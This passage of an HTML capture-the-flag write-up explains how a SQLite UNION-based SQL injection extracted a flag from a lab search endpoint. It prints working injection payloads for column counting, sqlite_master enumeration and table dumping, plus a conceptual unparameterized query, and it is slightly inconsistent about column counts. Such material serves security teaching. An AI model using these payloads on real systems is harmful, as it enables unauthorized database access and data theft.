@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF Writeup: SQL Injection — Archives of Alfheim</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #090810;
+      --bg2: #0e0c16;
+      --bg3: #13111e;
+      --border: #1c1830;
+      --accent: #fb923c;
+      --accent2: #fdba74;
+      --green: #4ade80;
+      --blue: #38bdf8;
+      --purple: #a78bfa;
+      --red: #f87171;
+      --yellow: #fbbf24;
+      --cyan: #22d3ee;
+      --text: #e2e8f0;
+      --muted: #4b5563;
+      --code-bg: #07060e;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 70% 40% at 70% -10%, rgba(251, 146, 60, 0.07) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 35% at 20% 110%, rgba(34, 211, 238, 0.04) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 0 24px;
+      position: relative;
+      z-index: 1;
+    }
+
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 20px 0;
+      position: sticky;
+      top: 0;
+      background: rgba(9, 8, 16, 0.93);
+      backdrop-filter: blur(12px);
+      z-index: 100;
+    }
+
+    .nav { display: flex; align-items: center; justify-content: space-between; }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+
+    .nav-tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .hero {
+      padding: 80px 0 60px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .category-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--accent);
+      background: rgba(251, 146, 60, 0.08);
+      border: 1px solid rgba(251, 146, 60, 0.2);
+      padding: 5px 12px;
+      border-radius: 4px;
+      margin-bottom: 28px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .category-tag::before { content: '▶'; font-size: 8px; }
+
+    h1 {
+      font-size: clamp(32px, 5vw, 52px);
+      font-weight: 800;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: var(--muted);
+      max-width: 600px;
+      line-height: 1.6;
+      margin-bottom: 36px;
+    }
+
+    .meta-row { display: flex; flex-wrap: wrap; gap: 24px; align-items: center; }
+
+    .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .meta-item .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); }
+
+    .difficulty {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--yellow);
+      background: rgba(251, 191, 36, 0.08);
+      border: 1px solid rgba(251, 191, 36, 0.2);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 28px; }
+
+    .tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--cyan);
+      background: rgba(34, 211, 238, 0.06);
+      border: 1px solid rgba(34, 211, 238, 0.15);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .content { padding: 60px 0; }
+
+    .tldr {
+      background: rgba(251, 146, 60, 0.06);
+      border: 1px solid rgba(251, 146, 60, 0.2);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 24px 28px;
+      margin-bottom: 48px;
+    }
+
+    .tldr-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .tldr p { font-size: 15px; color: #cbd5e1; line-height: 1.6; }
+
+    .flag-box {
+      background: rgba(74, 222, 128, 0.06);
+      border: 1px solid rgba(74, 222, 128, 0.2);
+      border-radius: 8px;
+      padding: 20px 24px;
+      margin: 32px 0;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .flag-icon { font-size: 28px; flex-shrink: 0; }
+    .flag-label { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green); letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 4px; }
+    .flag-value { font-family: 'JetBrains Mono', monospace; font-size: 16px; font-weight: 700; color: var(--green); }
+
+    h2 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fff;
+      margin: 56px 0 20px;
+      letter-spacing: -0.01em;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    h2::before {
+      content: attr(data-num);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent);
+      background: rgba(251, 146, 60, 0.1);
+      border: 1px solid rgba(251, 146, 60, 0.2);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 700;
+    }
+
+    h3 { font-size: 18px; font-weight: 700; color: #cbd5e1; margin: 32px 0 12px; }
+    p { font-size: 16px; color: #94a3b8; margin-bottom: 16px; line-height: 1.75; }
+    strong { color: #e2e8f0; font-weight: 700; }
+
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 0.06em; text-transform: uppercase; }
+    .code-dots { display: flex; gap: 6px; }
+    .code-dots span { width: 10px; height: 10px; border-radius: 50%; }
+    .code-dots span:nth-child(1) { background: #ff5f57; }
+    .code-dots span:nth-child(2) { background: #febc2e; }
+    .code-dots span:nth-child(3) { background: #28c840; }
+
+    pre {
+      padding: 20px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.65;
+    }
+
+    .kw { color: #c792ea; }
+    .str { color: #c3e88d; }
+    .fn { color: #82aaff; }
+    .cm { color: #352e50; font-style: italic; }
+    .var { color: #f78c6c; }
+    .num { color: #f78c6c; }
+    .sql-kw { color: #89ddff; font-weight: 700; }
+    .sql-str { color: #c3e88d; }
+    .sql-tbl { color: #ffcb6b; }
+    .sql-col { color: #f78c6c; }
+    .sql-op { color: #f87171; }
+    .hl { color: #fbbf24; font-weight: 700; }
+    .good { color: #4ade80; }
+    .bad { color: #f87171; }
+
+    code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent2);
+      background: rgba(251, 146, 60, 0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+
+    .info-box {
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      border-left: 3px solid var(--blue);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .info-box p { margin: 0; font-size: 14px; color: #93c5fd; }
+
+    .warning-box {
+      background: rgba(248, 113, 113, 0.06);
+      border: 1px solid rgba(248, 113, 113, 0.15);
+      border-left: 3px solid var(--red);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .warning-box p { margin: 0; font-size: 14px; color: #fca5a5; }
+
+    .finding {
+      background: linear-gradient(135deg, rgba(251, 146, 60, 0.08), rgba(34, 211, 238, 0.03));
+      border: 1px solid rgba(251, 146, 60, 0.2);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin: 24px 0;
+    }
+
+    .finding-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--accent); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 8px; }
+    .finding p { margin: 0; font-size: 15px; color: #fdba74; }
+
+    /* DB engine comparison */
+    .db-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin: 24px 0;
+    }
+
+    .db-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px;
+      transition: border-color 0.2s;
+    }
+
+    .db-card.active {
+      border-color: rgba(251, 146, 60, 0.4);
+      background: rgba(251, 146, 60, 0.04);
+    }
+
+    .db-card:hover { border-color: rgba(251, 146, 60, 0.3); }
+
+    .db-name { font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 700; color: #e2e8f0; margin-bottom: 6px; }
+    .db-name.active-name { color: var(--accent); }
+    .db-schema { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); }
+    .db-badge { display: inline-block; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--accent); background: rgba(251, 146, 60, 0.1); border: 1px solid rgba(251, 146, 60, 0.2); padding: 2px 6px; border-radius: 4px; margin-top: 8px; }
+
+    /* SQL query anatomy */
+    .query-anatomy {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin: 24px 0;
+    }
+
+    .query-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 16px; }
+
+    .query-line {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 2;
+      margin-bottom: 16px;
+      word-break: break-all;
+    }
+
+    .query-legend {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+    }
+
+    .legend-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .legend-dot { width: 10px; height: 10px; border-radius: 2px; flex-shrink: 0; }
+
+    /* Attack flow */
+    .attack-flow {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 32px;
+      margin: 32px 0;
+    }
+
+    .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 24px; }
+    .flow-steps { display: flex; flex-direction: column; gap: 0; }
+
+    .flow-step { display: flex; align-items: flex-start; gap: 16px; position: relative; }
+
+    .flow-step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 18px;
+      top: 36px;
+      width: 1px;
+      height: calc(100% - 12px);
+      background: var(--border);
+    }
+
+    .flow-num {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(251, 146, 60, 0.1);
+      border: 1px solid rgba(251, 146, 60, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent);
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+    }
+
+    .flow-content { padding: 6px 0 28px; }
+    .flow-label { font-size: 15px; font-weight: 700; color: #e2e8f0; margin-bottom: 4px; }
+    .flow-desc { font-size: 13px; color: var(--muted); font-family: 'JetBrains Mono', monospace; }
+
+    /* Error table */
+    .error-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+    }
+
+    .error-table th {
+      background: var(--bg3);
+      color: var(--accent2);
+      padding: 10px 14px;
+      text-align: left;
+      border: 1px solid var(--border);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .error-table td {
+      padding: 10px 14px;
+      border: 1px solid var(--border);
+      color: #94a3b8;
+      background: var(--bg2);
+      vertical-align: top;
+    }
+
+    .error-table tr:hover td { background: var(--bg3); }
+
+    .badge-error { color: var(--red); background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.2); padding: 2px 6px; border-radius: 4px; font-size: 11px; }
+    .badge-ok { color: var(--green); background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 2px 6px; border-radius: 4px; font-size: 11px; }
+
+    .divider { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+    footer { border-top: 1px solid var(--border); padding: 40px 0; margin-top: 40px; }
+    .footer-content { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
+    .footer-text { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
+    .footer-badge { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green); background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 4px 12px; border-radius: 4px; }
+
+    @media (max-width: 600px) {
+      .meta-row { flex-direction: column; gap: 12px; }
+      h2 { font-size: 22px; }
+      .db-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <nav class="nav">
+      <span class="nav-brand">RedFox CTF</span>
+      <span class="nav-tag">writeup / web / sql-injection</span>
+    </nav>
+  </div>
+</header>
+
+<div class="container">
+
+  <section class="hero">
+    <div class="category-tag">Web Security · SQL Injection</div>
+    <h1>Archives of Alfheim:<br>SQLite UNION-Based SQLi</h1>
+    <p class="subtitle">Wrong database engine assumptions, a key error message, and a hidden table — how we extracted the flag from a SQLite database using UNION-based SQL injection.</p>
+
+    <div class="meta-row">
+      <div class="meta-item"><span class="dot"></span><span>RedFox CTF 2026</span></div>
+      <div class="meta-item"><span class="dot"></span><span>Category: Web / SQLi</span></div>
+      <div class="meta-item"><span class="dot"></span><span>Challenge: Archives of Alfheim</span></div>
+      <div class="difficulty">MEDIUM</div>
+    </div>
+
+    <div class="tags">
+      <span class="tag">sql-injection</span>
+      <span class="tag">sqlite</span>
+      <span class="tag">union-based</span>
+      <span class="tag">sqlite_master</span>
+      <span class="tag">database-enumeration</span>
+      <span class="tag">error-based</span>
+    </div>
+  </section>
+
+  <article class="content">
+
+    <div class="tldr">
+      <div class="tldr-label">TL;DR</div>
+      <p>A search endpoint was vulnerable to SQL injection. Initial attempts using <strong>MySQL and PostgreSQL</strong> syntax failed with a revealing error — <code>no such table: information_schema.tables</code>. This told us the backend was <strong>SQLite</strong>. Switching to <code>sqlite_master</code> for table enumeration, we found a <code>sealed_tablets</code> table and dumped its <code>body</code> column to retrieve the flag.</p>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag</div>
+        <div class="flag-value">REDFOX{alfheim_archive_test}</div>
+      </div>
+    </div>
+
+    <!-- Challenge Description -->
+    <h2 data-num="01">Challenge Description</h2>
+    <p>The challenge lore read:</p>
+    <div class="info-box">
+      <p><em>"The archives of Alfheim are meant to preserve only what the scribes choose to reveal. Most visitors see polished records, curated entries, and harmless search results. But rumors speak of sealed tablets hidden from ordinary eyes."</em></p>
+    </div>
+    <p>We were presented with a search interface at <code>http://lab.redfoxsec.com:8402/</code>. The challenge description mentioned "search results" and "sealed tablets" — a clear hint that a hidden database table contained the flag, accessible only through SQL injection.</p>
+
+    <!-- Step 1 -->
+    <h2 data-num="02">Step 1 — Confirming SQL Injection</h2>
+    <p>The first step is always to test if the input is vulnerable. We sent a single quote to break the SQL string and observe the response:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">test payload</span>
+      </div>
+      <pre><span class="sql-op">'</span></pre>
+    </div>
+
+    <p>The server returned a database error — confirming the input was being passed directly into a SQL query without sanitization. This is a <strong>classic SQL injection vulnerability</strong>.</p>
+
+    <!-- Step 2 -->
+    <h2 data-num="03">Step 2 — Identifying the Database Engine</h2>
+    <p>The most important step in SQL injection is identifying which database engine is running. Different databases have different syntax, system tables, and string functions. We started with the most common approach — querying <code>information_schema.tables</code>:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">first attempt — mysql / postgresql syntax</span>
+      </div>
+      <pre><span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> table_name, <span class="sql-str">'a'</span>, <span class="num">1</span>, <span class="sql-str">'b'</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">information_schema.tables</span> <span class="sql-kw">WHERE</span> table_schema=<span class="sql-str">'public'</span><span class="sql-op">--</span></pre>
+    </div>
+
+    <p><strong>Error response:</strong></p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">error</span>
+      </div>
+      <pre><span class="bad">no such table: information_schema.tables</span></pre>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">⚡ Critical Clue</div>
+      <p>The error message <strong>"no such table: information_schema.tables"</strong> is extremely revealing. MySQL and PostgreSQL both have <code>information_schema</code>. The only common database that does NOT is <strong>SQLite</strong> — which uses <code>sqlite_master</code> instead.</p>
+    </div>
+
+    <h3>Database Engine Comparison</h3>
+    <p>Different databases use different system tables for schema introspection. Knowing which to use is the key to successful enumeration:</p>
+
+    <div class="db-grid">
+      <div class="db-card">
+        <div class="db-name">MySQL</div>
+        <div class="db-schema">information_schema.tables</div>
+        <div class="db-schema" style="margin-top:4px; color: #6b7280;">WHERE table_schema = database()</div>
+      </div>
+      <div class="db-card">
+        <div class="db-name">PostgreSQL</div>
+        <div class="db-schema">information_schema.tables</div>
+        <div class="db-schema" style="margin-top:4px; color: #6b7280;">WHERE table_schema = 'public'</div>
+      </div>
+      <div class="db-card active">
+        <div class="db-name active-name">SQLite ✓</div>
+        <div class="db-schema">sqlite_master</div>
+        <div class="db-schema" style="margin-top:4px; color: #6b7280;">WHERE type = 'table'</div>
+        <div class="db-badge">THIS ONE</div>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <h2 data-num="04">Step 3 — Finding the Column Count</h2>
+    <p>Before a UNION attack can work, the injected query must return the <strong>same number of columns</strong> as the original query. We used <code>ORDER BY</code> to find the column count — incrementing until we got an error:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">column count detection</span>
+      </div>
+      <pre><span class="sql-op">'</span> <span class="sql-kw">ORDER BY</span> <span class="num">1</span><span class="sql-op">--</span>   <span class="cm">→ OK</span>
+<span class="sql-op">'</span> <span class="sql-kw">ORDER BY</span> <span class="num">2</span><span class="sql-op">--</span>   <span class="cm">→ OK</span>
+<span class="sql-op">'</span> <span class="sql-kw">ORDER BY</span> <span class="num">3</span><span class="sql-op">--</span>   <span class="cm">→ OK</span>
+<span class="sql-op">'</span> <span class="sql-kw">ORDER BY</span> <span class="num">4</span><span class="sql-op">--</span>   <span class="cm">→ ERROR ← column count is 3</span></pre>
+    </div>
+
+    <p>The query has <strong>3 columns</strong>. All our UNION payloads must also return exactly 3 columns.</p>
+
+    <!-- Step 4 -->
+    <h2 data-num="05">Step 4 — Enumerating Tables with sqlite_master</h2>
+    <p>SQLite stores all schema information in a built-in table called <code>sqlite_master</code>. We queried it to list all user-created tables:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">sqlite table enumeration</span>
+      </div>
+      <pre><span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> name, <span class="sql-str">'a'</span>, <span class="num">1</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">sqlite_master</span> <span class="sql-kw">WHERE</span> type=<span class="sql-str">'table'</span><span class="sql-op">--</span></pre>
+    </div>
+
+    <p><strong>Response revealed:</strong></p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">output</span>
+      </div>
+      <pre><span class="good">sealed_tablets</span>   <span class="cm">← the hidden table!</span></pre>
+    </div>
+
+    <!-- Step 5 -->
+    <h2 data-num="06">Step 5 — Extracting the Schema</h2>
+    <p>Now that we had the table name, we extracted its full schema from <code>sqlite_master</code> using the <code>sql</code> column which stores the original <code>CREATE TABLE</code> statement:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">schema extraction</span>
+      </div>
+      <pre><span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> sql, <span class="sql-str">'a'</span>, <span class="num">1</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">sqlite_master</span> <span class="sql-kw">WHERE</span> type=<span class="sql-str">'table'</span> <span class="sql-kw">AND</span> name=<span class="sql-str">'sealed_tablets'</span><span class="sql-op">--</span></pre>
+    </div>
+
+    <p><strong>Response — the full CREATE TABLE statement:</strong></p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">sql</span>
+      </div>
+      <pre><span class="sql-kw">CREATE TABLE</span> <span class="sql-tbl">sealed_tablets</span> (
+  <span class="sql-col">id</span>    INTEGER PRIMARY KEY,
+  <span class="sql-col">title</span> TEXT,
+  <span class="sql-col">slug</span>  TEXT UNIQUE,
+  <span class="sql-col">body</span>  TEXT   <span class="cm">← flag lives here</span>
+)</pre>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">⚡ Schema Found</div>
+      <p>The table has 4 columns: <strong>id, title, slug, body</strong>. The flag is almost certainly in the <code>body</code> column — matching the "sealed tablets" narrative of hidden content.</p>
+    </div>
+
+    <!-- Step 6 -->
+    <h2 data-num="07">Step 6 — Dumping the Flag</h2>
+    <p>With the table structure known, we dumped all content from <code>sealed_tablets</code> using a clean UNION payload matching all 4 columns:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">final payload — dump all data</span>
+      </div>
+      <pre><span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> <span class="sql-col">title</span>, <span class="sql-col">body</span>, <span class="sql-col">slug</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">sealed_tablets</span><span class="sql-op">--</span></pre>
+    </div>
+
+    <p>Or targeting just the body column:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">targeted payload</span>
+      </div>
+      <pre><span class="sql-op">'</span> <span class="sql-kw">UNION SELECT</span> <span class="sql-col">body</span>, <span class="sql-str">'a'</span>, <span class="num">1</span> <span class="sql-kw">FROM</span> <span class="sql-tbl">sealed_tablets</span><span class="sql-op">--</span></pre>
+    </div>
+
+    <p><strong>Response:</strong></p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">output</span>
+      </div>
+      <pre>* <span class="sql-kw">Sun-Break Fragment</span> - <span class="good">REDFOX{alfheim_archive_test}</span></pre>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag Captured!</div>
+        <div class="flag-value">REDFOX{alfheim_archive_test}</div>
+      </div>
+    </div>
+
+    <!-- Full Attack Flow -->
+    <h2 data-num="08">Full Attack Flow</h2>
+
+    <div class="attack-flow">
+      <div class="flow-title">// complete attack chain</div>
+      <div class="flow-steps">
+
+        <div class="flow-step">
+          <div class="flow-num">1</div>
+          <div class="flow-content">
+            <div class="flow-label">Confirm SQL Injection</div>
+            <div class="flow-desc">Payload: ' → database error returned → injection confirmed</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">2</div>
+          <div class="flow-content">
+            <div class="flow-label">Identify Database Engine</div>
+            <div class="flow-desc">information_schema fails → "no such table" error → SQLite confirmed</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">3</div>
+          <div class="flow-content">
+            <div class="flow-label">Find Column Count</div>
+            <div class="flow-desc">ORDER BY 1,2,3 → OK | ORDER BY 4 → ERROR → 3 columns</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">4</div>
+          <div class="flow-content">
+            <div class="flow-label">Enumerate Tables</div>
+            <div class="flow-desc">UNION SELECT name FROM sqlite_master WHERE type='table' → sealed_tablets</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">5</div>
+          <div class="flow-content">
+            <div class="flow-label">Extract Schema</div>
+            <div class="flow-desc">UNION SELECT sql FROM sqlite_master → columns: id, title, slug, body</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">6</div>
+          <div class="flow-content">
+            <div class="flow-label">Dump the Flag</div>
+            <div class="flow-desc">UNION SELECT body FROM sealed_tablets → REDFOX{alfheim_archive_test}</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- How UNION SQLi works -->
+    <h2 data-num="09">How UNION-Based SQLi Works</h2>
+    <p>UNION injection works by appending a second <code>SELECT</code> statement to the original query. The original query might look like this internally:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">vulnerable server code (conceptual)</span>
+      </div>
+      <pre><span class="cm"># Vulnerable query construction — NO parameterization</span>
+search_term = request.get(<span class="str">"q"</span>)  <span class="cm"># user input, unfiltered</span>
+query = <span class="str">f"SELECT title, slug, body FROM records WHERE title LIKE '%</span>{search_term}<span class="str">%'"</span>
+
+<span class="cm"># When search_term = "test' UNION SELECT body,'a',1 FROM sealed_tablets--"</span>
+<span class="cm"># The query becomes:</span>
+<span class="cm"># SELECT title, slug, body FROM records WHERE title LIKE '%test'</span>
+<span class="cm"># UNION SELECT body,'a',1 FROM sealed_tablets--  %'</span>
+<span class="cm"># The -- comments out the rest, and UNION appends our results!</span></pre>
+    </div>
+
+    <div class="query-anatomy">
+      <div class="query-title">// how the injected query breaks down</div>
+      <div class="query-line">
+        <span style="color: #6b7280;">SELECT title, slug, body FROM records WHERE title LIKE '%</span><span style="color: #f87171;">test'</span>
+        <span style="color: #89ddff; font-weight:700;"> UNION SELECT </span>
+        <span style="color: #4ade80;">body</span>,
+        <span style="color: #94a3b8;">'a'</span>,
+        <span style="color: #94a3b8;">1</span>
+        <span style="color: #89ddff; font-weight:700;"> FROM </span>
+        <span style="color: #fbbf24;">sealed_tablets</span>
+        <span style="color: #6b7280;">--  %'</span>
+      </div>
+      <div class="query-legend">
+        <div class="legend-item"><div class="legend-dot" style="background:#6b7280"></div>Original query (harmless)</div>
+        <div class="legend-item"><div class="legend-dot" style="background:#f87171"></div>Quote breaks the string</div>
+        <div class="legend-item"><div class="legend-dot" style="background:#89ddff"></div>UNION appends our query</div>
+        <div class="legend-item"><div class="legend-dot" style="background:#4ade80"></div>Our column (flag)</div>
+        <div class="legend-item"><div class="legend-dot" style="background:#fbbf24"></div>Our target table</div>
+        <div class="legend-item"><div class="legend-dot" style="background:#6b7280"></div>-- comments out the rest</div>
+      </div>
+    </div>
+
+    <!-- Error-based fingerprinting -->
+    <h2 data-num="10">Error-Based DB Fingerprinting</h2>
+    <p>The error message we received was one of the most useful clues in the challenge. Understanding what errors indicate which database is a core SQLi skill:</p>
+
+    <table class="error-table">
+      <thead>
+        <tr>
+          <th>Error Message</th>
+          <th>Database</th>
+          <th>Use Instead</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code style="color:#f87171;">no such table: information_schema.tables</code></td>
+          <td style="color: var(--accent); font-weight:700;">SQLite</td>
+          <td><code>sqlite_master</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:#94a3b8;">Table 'x.information_schema' doesn't exist</code></td>
+          <td style="color: #94a3b8;">MySQL</td>
+          <td><code>information_schema.tables</code> WHERE table_schema=database()</td>
+        </tr>
+        <tr>
+          <td><code style="color:#94a3b8;">relation "information_schema.tables" does not exist</code></td>
+          <td style="color: #94a3b8;">PostgreSQL</td>
+          <td><code>information_schema.tables</code> WHERE table_schema='public'</td>
+        </tr>
+        <tr>
+          <td><code style="color:#94a3b8;">ORA-00942: table or view does not exist</code></td>
+          <td style="color: #94a3b8;">Oracle</td>
+          <td><code>all_tables</code> / <code>user_tables</code></td>
+        </tr>
+        <tr>
+          <td><code style="color:#94a3b8;">Invalid object name 'information_schema.tables'</code></td>
+          <td style="color: #94a3b8;">MSSQL</td>
+          <td><code>information_schema.tables</code> or <code>sysobjects</code></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <hr class="divider">
+
